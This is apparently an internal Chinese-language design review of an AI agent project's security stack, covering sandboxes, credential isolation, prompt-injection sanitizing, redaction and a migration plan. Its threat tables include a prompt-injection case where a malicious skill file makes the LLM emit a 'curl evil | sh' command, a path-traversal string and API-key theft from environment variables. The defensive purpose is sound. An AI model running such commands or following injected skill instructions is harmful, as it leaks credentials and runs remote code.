# 13 — ironclaw 安全能力清单 (路线 B 保留范围)

> **结论先行**: ironclaw 的安全栈共 ~25,000 行代码, 是本项目**最大的差异化优势**。
> codex / claw-code 在此领域**全面落后**。路线 B 的安全能力**必须完全保留 ironclaw**, 不可被"port codex"思路误伤。

---

## 1. 用户提问的 "Agent 不直接访问 LLM API key" 机制 ✅

### 精确描述

不是"把 agent 主体打成 wasm", 而是: **WASM 工具沙箱 + 凭证 host 边界注入**。

### 实现文件

| 文件 | 行数 | 职责 |
|---|---|---|
| [tools/wasm/credential_injector.rs](../../../desktop-client/ironclaw/src/tools/wasm/credential_injector.rs) | **639** | **核心**: WASM 工具永远看不到凭证值 |
| [tools/wasm/mod.rs](../../../desktop-client/ironclaw/src/tools/wasm) 等 15 文件 | ~3000+ | wasmtime 28 + WASI component model |

### 工作流程 (摘自 credential_injector.rs 头注释)

```text
WASM 工具发起 HTTP 请求 ──► Host 接收请求 ──► 按 host 域名匹配凭证
                                                  │
                              ┌───────────────────┘
                              ▼
                    从加密 SecretsStore 解密
                              │
                              ▼
                    注入到 HTTP 请求:
                    ├─► Authorization: Bearer xxx
                    ├─► X-API-Key: xxx
                    └─► ?api_key=xxx (query)
                              │
                              ▼
                    执行实际 HTTP 请求
```

### Capability opt-in 模型 (摘自 `wasm/capabilities.rs`)

```rust
/// By default, all capabilities are `None` (disabled).
/// Each must be explicitly granted.
pub struct Capabilities {
    pub workspace_read: Option<WorkspaceCapability>,
    pub http: Option<HttpCapability>,
    pub tool_invoke: Option<ToolInvokeCapability>,
    pub secrets: Option<SecretsCapability>,      // ← 只能 exists(), 不能 get()
    pub webhook: Option<WebhookCapability>,
    pub websocket: Option<serde_json::Value>,
}
```

**关键**: 工具必须在 manifest 显式声明 capability, host 才授予对应 host function。

---

## 2. ironclaw 完整安全能力清单 (11 大类)

### 2.1 能力一览

| # | 模块 | 行数 | 路径 | 路线 B 决策 |
|---|---|---|---|---|
| 1 | **WASM 工具沙箱** | 15 文件 ~3000+ | `tools/wasm/` | ✅ 完全保留 |
| 2 | **凭证 host 边界注入** | 639 | `tools/wasm/credential_injector.rs` | ✅ 完全保留 |
| 3 | **Secrets 存储** | 2,546 | `secrets/` | ✅ 完全保留 |
| 4 | **Docker 容器沙箱** | 2,251 | `sandbox/` | ✅ 保留 + 选择性借鉴 codex seccomp |
| 5 | **Sandbox 出口代理** | 1,360 | `sandbox/proxy/` | ✅ 完全保留 |
| 6 | **`ironclaw_safety` crate** (+ fuzz) | **4,849** | `crates/ironclaw_safety/` | ✅ **完全保留, 不动一行** |
| 7 | **Redaction 自动脱敏** | 251 | `tools/redaction.rs` | ✅ 完全保留 |
| 8 | **Extensions 沙箱** | 11,786 | `extensions/` | ✅ 完全保留 |
| 9 | **`ironclaw_workspace_cap` crate** | 568 | `crates/ironclaw_workspace_cap/` | ✅ 完全保留 |
| 10 | **Network Security 威胁模型** | 文档 | `src/NETWORK_SECURITY.md` | ✅ 维护更新 |
| 11 | **Tenant 与 AdminScope 治理** | — | `tenant.rs` + `profile.rs` | ✅ 完全保留 |

**合计**: ~25,000 行安全相关代码 + fuzz 测试。

---

### 2.2 WASM 工具沙箱 (`tools/wasm/`) — 15 文件

| 文件 | 职责 |
|---|---|
| `runtime.rs` | wasmtime 运行时主控 |
| `host.rs` | Host functions (暴露给 WASM 的边界 API) |
| `loader.rs` | WASM component 加载 + 签名校验 |
| `wrapper.rs` | Tool trait 实现 + 调用包装 |
| `capabilities.rs` (419) | Capabilities 声明模型 (opt-in) |
| `capabilities_schema.rs` | JSON schema 校验 |
| `credential_injector.rs` (639) | **凭证注入边界** |
| `allowlist.rs` | HTTP endpoint 白名单 (host + path + method) |
| `limits.rs` | 资源限制 (内存 / 时间 / fuel) |
| `storage.rs` | 工具级存储 |
| `error.rs` | 错误类型 |
| `mod.rs` | 模块入口 |

**依赖**: `wasmtime = "28" features=["component-model"]`, `wasmtime-wasi = "28"` (见 `desktop-client/ironclaw/Cargo.toml`).

**默认安全策略**: 所有 capability 默认 `None`, 必须显式 grant。

---

### 2.3 Secrets 存储 (`secrets/`) — 2,546 行

| 文件 | 行数 | 职责 |
|---|---|---|
| `mod.rs` | 170 | 模块入口 |
| `types.rs` | 506 | SecretRecord / CredentialMapping / DecryptedSecret 类型 |
| `crypto.rs` | 373 | AES/ChaCha20 加密 + master key 派生 |
| `keychain.rs` | 318 | OS Keychain (macOS Keychain Access / Windows Credential Manager) |
| `store.rs` | 974 | SecretsStore 主逻辑 + CRUD + 访问审计 |
| `agent_provider.rs` | 205 | Agent 调用接口 (仅返回 Decrypted, 不返回原文) |

**核心**: master key 存 OS Keychain, 实际 secret 加密存 sqlite, 运行时 on-demand 解密。

---

### 2.4 Docker 容器沙箱 (`sandbox/`) — 2,251 行

> ⚠️ **架构说明** (见 `adr-001-sandbox-hook-not-wired-in-phase3.md`):  
> ironclaw 真实沙箱是**进程外 daemon** 架构 (`src/bridge/sandbox/` + `src/bin/sandbox_daemon.rs`), 不是进程内 hook。

| 文件 | 行数 | 职责 |
|---|---|---|
| `container.rs` | 635 | Docker container 生命周期管理 |
| `manager.rs` | 697 | SandboxManager + 多 container 编排 |
| `agent_executor.rs` | 277 | `x_claw_agent::SandboxExecutor` adapter (Phase 3 未接线) |
| `config.rs` | 233 | 沙箱配置 |
| `detect.rs` | 235 | Docker 可用性检测 |
| `mod.rs` | 116 | 模块入口 |
| `error.rs` | 58 | 错误类型 |

**Container 安全保证** (摘自 `container.rs` 头注释):
- 环境变量**明确无 secret** (`Environment: http_proxy=..., No secrets or credentials`)
- `/workspace` 按 policy 挂 ro/rw
- `/output` 挂 rw
- 资源限制 (CPU / memory / pid / network)
- 强制走 HTTP proxy (`host.docker.internal:PORT`)

---

### 2.5 Sandbox 出口代理 (`sandbox/proxy/`) — 1,360 行

| 文件 | 行数 | 职责 |
|---|---|---|
| `http.rs` | 556 | HTTP 代理服务器 |
| `allowlist.rs` | 335 | 域名白名单校验 |
| `policy.rs` | 306 | Policy decider (允许/拒绝/需审批) |
| `mod.rs` | 163 | 架构图 + 入口 |

**架构** (摘自 `proxy/mod.rs`):
```
┌──────────────┐   ┌──────────┐   ┌──────────────────────┐
│ HTTP Proxy   │──▶│ Policy   │──▶│ Credential Resolver  │
│ Server       │   │ Decider  │   │                      │
└──────────────┘   └──────────┘   └──────────────────────┘
                        │
                        ▼
                 ┌──────────────┐
                 │ Allowlist    │
                 │ Validator    │
                 └──────────────┘
```

**价值**: 容器内流量必须经此代理出去, 在 proxy 边界完成 "白名单校验 + 凭证注入" 双重控制。

---

### 2.6 `ironclaw_safety` crate (4,849 行 + fuzz) ⭐ 最高质量安全代码

**位置**: `desktop-client/ironclaw/crates/ironclaw_safety/`

| 文件 | 行数 | 职责 |
|---|---|---|
| `lib.rs` | 615 | crate 入口 + 公共 API |
| `policy.rs` | 535 | 安全策略引擎 (rule-based decision) |
| `sanitizer.rs` | 725 | **Prompt injection 清洗** (input/output filter) |
| `validator.rs` | 776 | 请求/响应校验 |
| `credential_detect.rs` | 637 | ★ **自动检测 LLM 输出中的凭证泄漏** |
| `leak_detector.rs` | 1,336 | ★ **大数据泄漏检测 (DLP)** |
| `agent_hook.rs` | 225 | agent 钩子注入点 |

### Fuzz 测试 (项目中唯一)

```
crates/ironclaw_safety/fuzz/
├── Cargo.toml
└── corpus/
    ├── fuzz_safety_sanitizer/   ← prompt 清洗 fuzz 语料
    ├── fuzz_safety_validator/   ← 验证器 fuzz 语料
    └── fuzz_config_env/         ← 配置环境 fuzz 语料
```

**地位**: 这是项目**唯一**有 fuzz 测试的 crate, 安全等级最高。

---

### 2.7 Redaction (`tools/redaction.rs`) — 251 行

自动脱敏 18+ 敏感字段:

```rust
const SENSITIVE_EXACT: &[&str] = &[
    "authorization", "proxy-authorization", "cookie", "set-cookie",
    "x-api-key", "api-key", "api_key",
    "access_token", "refresh_token", "session_token", "id_token", "token",
    "password", "passwd", "secret", "client_secret",
    "private_key", "apikey", "apisecret",
];

const SENSITIVE_PARTS: &[&str] = &[
    "password", "passwd", "secret", "credential", ...
];
```

**用途**: 工具调用参数/返回/日志在落盘前自动 `[REDACTED]` 替换。

---

### 2.8 `ironclaw_workspace_cap` crate (568 行) — 路径逃逸防护

**位置**: `crates/ironclaw_workspace_cap/src/lib.rs`

**原理** (摘自文件头注释):

> 基于 `cap_std::fs::Dir`, 在 **OS 内核层** (`openat` + symlink 控制) 强制每个文件系统访问都在单一 root 目录内。
> 这是 ironclaw 沙箱栈的 *应用层* (ADR-002), 与 *内核层* (Landlock / sandbox-exec / Windows Restricted Token) 互补。

### 保证 (Guarantees)
- ✅ 绝对路径 **被拒绝**
- ✅ `..` 逃逸 **被拒绝**
- ✅ 指向 root 外的 symlink 在 open 时 **被拒绝**
- ✅ root 自身的 TOCTOU 竞争 **被消除** (持有 directory fd 作为 capability)

### 明确非保证 (by design)
- ❌ 不限制子进程 — 内核沙箱层的职责
- ❌ 不强制 DLP/审批 — `ironclaw_safety` 的职责
- ❌ 不限制文件大小/数量 — 调用方职责

**价值**: Rust 进程自身的路径安全, 防 `../../../etc/passwd` 类攻击。

---

### 2.9 NETWORK_SECURITY.md 威胁模型

**位置**: `desktop-client/ironclaw/src/NETWORK_SECURITY.md`

### 4 层信任边界

| 边界 | 信任等级 | 示例 |
|---|---|---|
| Local user | 完全信任 | TUI / Web Gateway loopback |
| Browser client | 已认证 | Bearer token + CORS + Origin + CSRF |
| **Docker containers** | **不信任** (沙箱化) | per-job token + allowlist egress + dropped capabilities |
| **External services** | **不信任** | Telegram/Slack webhook shared secret |

### 5 个监听端口审计

| Listener | Port | Bind | Auth |
|---|---|---|---|
| Web Gateway | 3000 | `127.0.0.1` | Bearer token (constant-time) |
| HTTP Webhook | 8080 | `0.0.0.0` | Shared secret (body) |
| Orchestrator API | 50051 | loopback (mac/win) / 0.0.0.0 (linux) | Per-job bearer (constant-time) |
| OAuth Callback | 9876 | `127.0.0.1` | None (ephemeral 5-min) |
| Sandbox HTTP Proxy | ephemeral | `127.0.0.1` | None (loopback only) |

**价值**: 完整可审计的网络安全文档, 合规审查必备。

---

## 3. 与 codex / claw-code 对比

| 安全能力 | codex | claw-code | ironclaw |
|---|---|---|---|
| WASM 工具沙箱 + capability opt-in | ❌ | ❌ | ✅ **独有** |
| 凭证 host 边界注入 (tool 看不到 secret) | ❌ | ❌ | ✅ **独有** |
| OS Keychain 集成 | ⚠️ 基础 | ❌ | ✅ 完整 |
| Docker 容器沙箱 + 出口代理 + 白名单 | ✅ 进程级 sandbox_linux/win | ⚠️ 基础 | ✅ 容器级 + proxy + allowlist |
| **Prompt injection fuzz 测试** | ❌ | ❌ | ✅ **独有 (项目唯一)** |
| **自动凭证泄漏检测** (LLM 输出扫描) | ❌ | ❌ | ✅ `credential_detect.rs` |
| **大数据泄漏检测 (DLP)** | ❌ | ❌ | ✅ `leak_detector.rs` |
| 自动 redaction (18+ 字段) | ⚠️ | ⚠️ | ✅ |
| Capability-based FS (cap_std TOCTOU-safe) | ❌ | ❌ | ✅ `ironclaw_workspace_cap` |
| 4 层威胁模型文档 | ❌ | ❌ | ✅ NETWORK_SECURITY.md |
| Extensions 沙箱 (11k 行) | ❌ | ❌ | ✅ 完整 |

**结论**: 本领域 ironclaw **全面领先**。

---

## 4. 对路线 B 架构设计的修正

### 4.1 三层沙箱栈15 — 不是"二选一", 是"三者并存"

```text
┌───────────────────────────────────────────────────────────┐
│  L1 主进程 FS 防护 (用户态 / 应用层)                              │
│  ironclaw_workspace_cap (568 行, cap_std)                             │
│  ── 防 ../ 逃逸, 防 symlink 逃逸, TOCTOU-safe                      │
│  ── 作用: Rust 主进程自己的 fs::read/write                          │
└───────────────────────────────────────────────────────────┘
                       ▲ 与下层互补, 不重复
┌───────────────────────────────────────────────────────────┐
│  L2 子进程沙箱 (内核态 / OS 原生)                                  │
│  dasclaw_sandbox_linux (port codex linux-sandbox 4780 行)             │
│  dasclaw_sandbox_windows (port codex windows-sandbox-rs 9753 行)      │
│  ── Linux: bubblewrap + seccomp + landlock + proxy_routing (netns)    │
│  ── Windows: Restricted Token + Cap SID + ACL + Firewall             │
│  ── 作用: LLM 调用的 bash / python / exec 子进程                     │
└───────────────────────────────────────────────────────────┘
                       ▲ 与下层互补, 更外围
┌───────────────────────────────────────────────────────────┐
│  L3 容器沙箱 (OS 级虚拟化)                                           │
│  ironclaw sandbox/ + sandbox/proxy/ (3611 行, Docker)                  │
│  ── Docker container + 出口代理 + 域名白名单 + 凭证注入           │
│  ── 作用: 外部 MCP / 不可信任务 / 高风险操作的兔底              │
└───────────────────────────────────────────────────────────┘
```

**三层完全互补, 缺任一层均有安全缺口**:
- 仅 L1 → 子进程不受限, 能跳出 workspace
- 仅 L2 → 主进程 的 Rust 代码路径 bug 仍能逃逸
- 仅 L3 → 每次 bash 都起容器 (性能灾难), 且内部出现敏感操作仍无 fast-path 防护

### 4.2 对原 11 文档 §6/§7 的修正

**正确方案**:

| crate / 模块 | 行数 | 来源 | 技术 | 路线 B 决策 |
|---|---|---|---|---|
| `ironclaw_workspace_cap` | 568 | ironclaw 原生 | cap_std | ✅ **保留**, 不 port codex |
| `dasclaw_sandbox` (统一管理器) | ~1000 | **codex sandboxing/ port** | 跨平台 policy 分发 | ★ **新增** |
| `dasclaw_sandbox_linux` | ~4,780 | **codex linux-sandbox port** | bubblewrap + seccomp + landlock + netns | ★ **新增** |
| `dasclaw_sandbox_windows` | ~9,753 | **codex windows-sandbox-rs port** | Restricted Token + Cap SID + ACL + Firewall | ★ **新增** |
| `dasclaw_sandbox_macos` | ~721 + .sbpl | **codex sandboxing/src/seatbelt.rs port** | Seatbelt / sandbox-exec + TrustedBSD MAC 策略 | ★ **新增** |
| `ironclaw sandbox/` + `sandbox/proxy/` | 3,611 | ironclaw 原生 | Docker host 侧 + 出口代理 + allowlist | ✅ **保留** |
| `ironclaw worker/` | 5,343 | ironclaw 独有 | 容器内 guest runtime + ProxyLlmProvider | ✅ **保留** |

**该 port 的**: codex 的 linux-sandbox / windows-sandbox-rs (ironclaw 无子进程级沙箱实现)
**该保留的**: ironclaw 的 workspace_cap (应用层) + sandbox (容器层)
**不是二选一关系**。

### 4.3 原上轮修订不准确之处

上一轮 13 文档说 "仅借鉴 codex seccomp 加固" 不准确。正确表述:
- codex linux-sandbox 是 **4780 行完整模块**, 不是可以 "借鉴思路" 的片段, 需整 port
- codex windows-sandbox-rs 是 **9753 行**, 同样需整 port
- 两者与 ironclaw Docker 沙箱**低层不同**, **不能相互替代**

---

## 5. 路线 B 安全能力归属 (最终版)

| 层级 | 能力 | 实现来源 | 路线 B 决策 |
|---|---|---|---|
| **L1 主进程 FS 防护 (应用层)** | cap_std TOCTOU-safe | `ironclaw_workspace_cap` (568) | ✅ 保留 |
| **L2 子进程沙箱 (统一管理)** | 跨平台 policy 分发 | `dasclaw_sandbox` ← port codex sandboxing/ | ★ 新增 |
| **L2 子进程沙箱 (内核层, Linux)** | bubblewrap + seccomp + landlock + netns | `dasclaw_sandbox_linux` ← port codex linux-sandbox (4780) | ★ 新增 |
| **L2 子进程沙箱 (内核层, Windows)** | Restricted Token + Cap SID + ACL + Firewall | `dasclaw_sandbox_windows` ← port codex windows-sandbox-rs (9753) | ★ 新增 |
| **L2 子进程沙箱 (内核层, macOS)** | Seatbelt / sandbox-exec + .sbpl 策略 | `dasclaw_sandbox_macos` ← port codex sandboxing/src/seatbelt.rs (721) | ★ 新增 |
| **L3 容器沙箱 host 侧** | Docker + proxy + allowlist | `ironclaw sandbox/` + `sandbox/proxy/` (3611) | ✅ 保留 |
| **L3 容器沙箱 guest 侧** | 容器内 runtime + ProxyLlmProvider 反向调用 | `ironclaw worker/` (5343) | ✅ 保留 |
| **L4 工具沙箱 (WASM)** | wasmtime + capability opt-in | `ironclaw tools/wasm/` (15 文件) | ✅ 保留 |
| **L5 凭证边界** | credential_injector + SecretsStore | `ironclaw secrets/` + `tools/wasm/credential_injector.rs` | ✅ 保留 |
| **L6 内容安全 (DLP)** | Prompt sanitize + credential/leak detect + policy | `ironclaw_safety` (4849 + fuzz) | ✅ 保留 |
| **L7 日志脱敏** | 18+ 敏感字段自动 redact | `tools/redaction.rs` | ✅ 保留 |
| **L8 网络审计** | 4 边界 + 5 端口 + 威胁模型 | `NETWORK_SECURITY.md` | ✅ 维护 |
| **L9 Extension 治理** | 插件元数据校验 + 沙箱 | `extensions/` | ✅ 保留 |

**9 层纵深防御栈**。L1+L3+L4+L5+L6+L7+L8+L9 保留 ironclaw, L2 新增 (port codex 三平台 + 统一管理器)。

---

## 5.5 py / node 脚本在 L2 子进程沙箱的执行模型与风险

### 现状澄清

ironclaw 当前 `skills/` (3,665 行) 是 **SKILL.md 规范**, 按 `skills/mod.rs` 头注释:

> Skills are SKILL.md files (YAML frontmatter + markdown prompt) that extend the agent's behavior through **prompt-level instructions**. Unlike code-level tools (WASM/MCP), skills operate in the **LLM context** and are subject to trust-based authority attenuation.

即 **skills 本身不是可执行脚本**, 是 prompt 注入 + 信任衰减算法。真正"跑 py/node 脚本"的路径是 **`tools/builtin/shell` → L2 沙箱 → 解释器子进程**。

### py / node 能跑吗?

**可以**。进程沙箱的本质是"创建子进程时施加内核级限制", 跟子进程运行什么语言解耦:
- Linux: bubblewrap bind-mount `/usr/bin/python3`, `/usr/bin/node`, 配合 seccomp policy 放行 py/node 所需 syscall
- Windows: Restricted Token 启动 `python.exe` / `node.exe`
- macOS: `sandbox-exec -f policy.sbpl /usr/bin/python3 script.py`

### 5 类攻击面 + mitigation

| # | 攻击面 | 问题描述 | 沙箱侧 mitigation |
|---|--------|----------|------------------|
| 1 | **子进程 fork/exec** | py 的 `subprocess.Popen`, node 的 `child_process.spawn` 可能逃到无沙箱孙子进程 | Linux: seccomp deny `execve` (clone 要放给 node 起线程用); macOS: Seatbelt `(deny process-exec)`; Windows: Job Object `LIMIT_BREAKAWAY_OK=0` |
| 2 | **FS 逃逸写盘** | pip/npm 默认写 `~/.cache`, `~/.npm`, `/tmp` 等非 workspace 位置 | landlock / Seatbelt `(deny file-write*)` / Windows ACL, 仅放行 workspace + tmpfs |
| 3 | **网络外联** | `pip install` / `npm install` / 被污染依赖的 C2 外联 | **netns + egress proxy allowlist** (codex network-proxy + ironclaw sandbox/proxy/), 禁 DNS 直查 |
| 4 | **资源耗尽** | `while True: subprocess(...)` / fork bomb / OOM | Linux cgroups v2 (`pids.max` / `memory.max` / `cpu.max`); Windows Job Object 限额; macOS `taskpolicy` + `ulimit` |
| 5 | **解释器本体 CVE** | Python/Node 自身 RCE CVE (V8, zlib, …) | 版本固定 + 自动更新 + **硬编码绝对路径**(抄 codex seatbelt.rs `MACOS_PATH_TO_SEATBELT_EXECUTABLE = "/usr/bin/sandbox-exec"` 的防 PATH 注入思路) |

### 项目特有的 2 类追加风险

| # | 攻击面 | mitigation 归属层 |
|---|--------|------------------|
| 6 | **LLM prompt 间接命令注入** (坏 SKILL.md 诱导 LLM 生成 `os.system("curl evil \| sh")`) | L6 `ironclaw_safety` (prompt sanitize) + claw-code 治理层 `ApprovalPolicy` + shell allowlist |
| 7 | **环境变量泄密** (py 进程 `os.environ.get("OPENAI_API_KEY")`) | L2 子进程启动必须**清空 env**, 凭证只通过 L5 credential_injector 在边界注入; 与 WASM 层同原则 |

### 结论

> **可以跑, 但"五件套齐上"不是 port codex 就能拿到**。详见 §5.5.1 codex 五件套真实现状审计。

### 5.5.1 codex OS 原生沙箱五件套审计 (经源码验证)

**三强两缺**, 不是想象中的"port 即齐":

| # | 五件套能力 | codex 实现 | 证据 (文件:行) | 评价 |
|---|-----------|-----------|---------------|------|
| 1 | **deny-exec seccomp** | ❌ 不做 | `sandboxing/src/seatbelt_base_policy.sbpl:10-11` 明确 `(allow process-exec)` + `(allow process-fork)`; Linux seccompiler 只用于**网络过滤** (`linux-sandbox/src/landlock.rs:67` `install_network_seccomp_filter_on_current_thread`) | **弱** |
| 2 | **landlock / Seatbelt 写保护** | ✅ 完整 | `linux-sandbox/src/landlock.rs:15-22` 引入 `landlock` crate 全套; macOS Seatbelt `(deny default)` closed-by-default | **强** |
| 3 | **netns + egress proxy** | ✅ 完整 | `linux-sandbox/src/bwrap.rs:156-157` `--unshare-net`; `proxy_routing.rs:121` `activate_proxy_routes_in_netns` (797 行) | **强** |
| 4 | **cgroups / rlimit 资源限额** | ❌ **完全没有** | `grep cgroup\|rlimit\|RLIMIT\|setrlimit linux-sandbox/ sandboxing/` 全仓零命中 | **缺** |
| 5 | **env clear 默认开启** | ⚠️ 疑缺 | `grep clearenv\|env_clear\|--clearenv` 零命中 (bwrap 支持 `--clearenv` 但 codex 不用) | **疑缺** |

**设计哲学推测**: codex 面向开发者本地工作站, 设计重点是"防 FS 逃逸 + 防网络外联", 不管资源耗尽和子进程创建 (Python/Node worker 需要 fork)。

### 5.5.2 Route B 补齐方案

**Port codex 三平台 ≠ 获得完整五件套**。Route B 必须在 ironclaw 侧额外做:

| 缺口 | Route B 补救 | 归属 | Wave |
|------|------------|------|------|
| **cgroups v2 资源限额** | 新增 `dasclaw_sandbox_resources` (Linux systemd-run / cgroups v2 API, `pids.max` / `memory.max` / `cpu.max`) | ★ 新建, ironclaw 原创 | W7 |
| **可选 deny-exec 模式** | 扩展 codex seccomp policy, 高风险场景 (外部 MCP / 不可信 skill) 切 "no-exec" profile | 修改 codex fork, NOTICE 注明 | W7 |
| **env clear 默认开启** | port bwrap 时默认传 `--clearenv`, 只放行 allowlist 环境变量 (避免 `OPENAI_API_KEY` 等泄漏给 py/node 子进程) | port 时加固 | W7 |

**结论修订**: 之前说"W7 port 完就有完整五件套"**不准确**。准确说法是:

> **W7 = codex 三平台 port (~15,254 行) + ironclaw 补 cgroups + 修 codex fork 开 deny-exec + bwrap 默认 clearenv 加固四项, 才能达到"五件套齐上"**。

---

## 5.6 ironclaw 外围模块 Route B 归属 (补充)

| 模块 | LOC | 一句话职责 | Route B 决策 |
|------|----|----------|------------|
| `skills/` | 3,665 (7 文件) | SKILL.md prompt 层扩展 + trust attenuation (trusted/installed 两态, 最低信任降级) | ⚠️ **重新评估**: port codex `skills/` (include_dir 内置 + system cache) + `core-skills/` (SkillsManager/injection/render/loader/remote/model) 作为骨架, 叠加 ironclaw `attenuation.rs` 信任衰减 — 见 §5.6.1 |
| `evaluation/` | 965 (3 文件) | Job 完成质量评估 (output quality / requirements match / error rate / user feedback) | ✅ **保留 ironclaw** (B 端产品差异) |
| `observability/` | 835 (6 文件) | Trait-based Observer 插件 (noop/log/multi + prompt_cache), 预留 OTel/Prometheus 扩展位 | ✅ **保留 ironclaw** |
| `worker/` ⚠️ | 5,343 (7 文件) | **L3 Docker 容器内 guest runtime**: `ironclaw worker` 子命令, 内置 `ProxyLlmProvider` 把 LLM 调用反向代理回 orchestrator → **容器内不持有 API key**, 与 L5 credential_injector 同一"边界注入"思路 | ✅ **保留 ironclaw** (L3 的不可分割组件) |

**`worker/` 是之前 §2.4 遗漏的关键发现**: L3 Docker 沙箱实际是 **host (`sandbox/` 3,611 行) + guest (`worker/` 5,343 行) 双侧协同**, 合计 8,954 行, 不是之前文档说的 3,611 行单侧。

### 5.6.1 skills 归属修正 (Round 11 发现)

**上一轮说 "codex 无 skills 概念" 是错的**。核实后:

| 维度 | codex | ironclaw |
|------|-------|---------|
| crate | `codex-rs/skills/` + `codex-rs/core-skills/` | `desktop-client/ironclaw/src/skills/` |
| 格式 | `---
name:
description:
---
<markdown>` | `---
name:
description:
---
<markdown>` (完全一致) |
| 内置 | `.codex/skills/` 10 个 (babysit-pr / code-review 系列 / codex-bug / remote-tests / test-tui) | `SkillRegistry` 无内置 |
| 注入 | `core-skills/src/injection.rs` `build_skill_injections()` → `SkillInjection{name,path,contents}` | `skills/selector.rs` prefilter + 直接拼 prompt |
| **独有**: 内置 bundle | ✅ `include_dir!` 把 skills 编译进二进制 + `install_system_skills()` 指纹 marker | ❌ |
| **独有**: 加载分层 | ✅ loader/remote/render/manager/model 完整分层 | ❌ 单 registry |
| **独有**: 信任衰减 | ❌ | ✅ `attenuation.rs` (trusted/installed 两态取最低) |
| **独有**: Gating | ❌ | ✅ `gating.rs` 运行时工具探测 (`which`/`where`) |
| **脚本携带** | ✅ `babysit-pr/scripts/*.py` (LLM 读到 prompt 后调 shell 工具执行) | ✅ 同模式 |

**执行路径两边一致**: skills **不直接执行**脚本, 由 prompt → LLM 决策 → shell 工具 → L2 沙箱。

**Route B 决策修正**:
- **骨架**: port codex `skills/` + `core-skills/` (**~3,000+ 行**, include_dir 内置 + SkillsManager + injection + loader + remote)
- **叠加**: 保留 ironclaw `attenuation.rs` (226 行) + `gating.rs` (167 行) 作为**安全层增强**, 在 codex SkillPolicy 之上加一层信任衰减
- **新 crate 名**: `dasclaw_skills` (不再用 ironclaw `skills/`), 依赖 `ironclaw_safety` 的信任模型

---

## 6. Action Items

- [ ] 修订 11 文档 §6 目录规划:
  - [ ] `dasclaw_sandbox_linux/windows` 从 "codex port" 改为 "保留 ironclaw sandbox + codex seccomp 借鉴"
  - [ ] 新增 "★保留 ironclaw 安全栈" 章节, 列出 8 层防御
- [ ] 修订 11 文档 §7 能力归属表, 补"安全"相关行
- [ ] Wave 路线图中**禁止把安全能力放在早期 Wave** (避免破坏现有防御)
- [ ] 移植 codex sandbox_linux 加固时, 走"增量集成"而非"整替换"

---

## 附录: 相关 ADR

- `adr-001-sandbox-hook-not-wired-in-phase3.md` — 为何 Phase 3 未接线进程内 sandbox hook
- `adr-002-...md` (引用自 workspace_cap lib.rs) — 沙箱双层架构: 应用层 (cap_std) + 内核层 (Landlock/sandbox-exec/Restricted Token)
